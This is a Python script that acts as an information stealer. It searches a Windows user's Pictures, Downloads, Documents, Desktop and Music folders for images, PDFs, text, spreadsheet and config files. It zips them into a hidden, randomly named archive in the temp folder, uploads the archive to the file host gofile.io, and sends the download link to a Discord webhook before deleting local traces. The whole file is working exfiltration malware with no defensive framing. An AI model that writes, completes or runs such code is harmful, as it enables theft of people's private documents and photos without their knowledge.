import os ; import zipfile
import requests ; import time
from sys import executable ; from string import ascii_lowercase
from subprocess import call, Popen ; from random import choices

requirements = [["requests", "requests"]]
for modl in requirements:
    try: __import__(modl[0])
    except:
        Popen(f"{executable} -m pip install {modl[1]}", shell=True)
        time.sleep(3)

ALLOWED_EXT = ['.pdf', '.txt', '.xlsm', '.cfg']
PIC_EXT = ['.png', '.jpg']

PIC_LOCS = ['Pictures', 'Downloads']
OTHER_LOCS = ['Documents', 'Downloads', 'Music', 'Desktop']

HOOK = "Discord_webhook_here"
ADDED_FILES = set()
TEMP = os.getenv('temp')

ARCHIVE = ''.join(choices(ascii_lowercase, k=15)) + '.zip'
COUNT = ''.join(choices(ascii_lowercase, k=15)) + '.txt'

APATH = os.path.join(TEMP, ARCHIVE)
CPATH = os.path.join(TEMP, COUNT)

PIC_DIRS = [os.path.join(os.getenv('userprofile'), loc) for loc in PIC_LOCS]
OTHERS_DIRS = [os.path.join(os.getenv('userprofile'), loc) for loc in OTHER_LOCS]

for dirs in [PIC_DIRS]:
    for dir_path in dirs:
        if os.path.isdir(dir_path):
            for root, _, files in os.walk(dir_path):
                for file in files:
                    if file.endswith(tuple(PIC_EXT)) and not file.startswith('.'):
                        file_path = os.path.join(root, file)
                        if os.path.isfile(file_path):
                            #print(file_path)
                            ADDED_FILES.add(file_path)

for dir_path in OTHERS_DIRS:
    if os.path.isdir(dir_path):
        for root, _, files in os.walk(dir_path):
            for file in files:
                if file.endswith(tuple(ALLOWED_EXT)) and not file.startswith('.'):
                    file_path = os.path.join(root, file)
                    if os.path.isfile(file_path):
                        #print(file_path)
                        ADDED_FILES.add(file_path)

with open(CPATH, 'w') as count_file:
    for file_path in ADDED_FILES:
        count_file.write(file_path + '\n')

with zipfile.ZipFile(APATH, 'w', zipfile.ZIP_DEFLATED, allowZip64=True, ) as zip_file:
    for file_path in ADDED_FILES:
        zip_file.write(file_path, os.path.relpath(file_path, os.path.dirname(file_path)))

call(['attrib', '+h', APATH])
call(['attrib', '+h', CPATH])


with open(ARCHIVE, "rb") as file:
    response = requests.post(f"https://{requests.get('https://api.gofile.io/getServer').json()['data']['server']}.gofile.io/uploadFile", files={"file": file})
    download_url = response.json().get("data", {}).get("downloadPage")

if download_url:
    requests.post(HOOK, json={"content": download_url})
    os.remove(COUNT)
    os.remove(ARCHIVE)
else:
    requests.post(HOOK, json={"content": "Error al cargar el archivo en GoFile.io"})
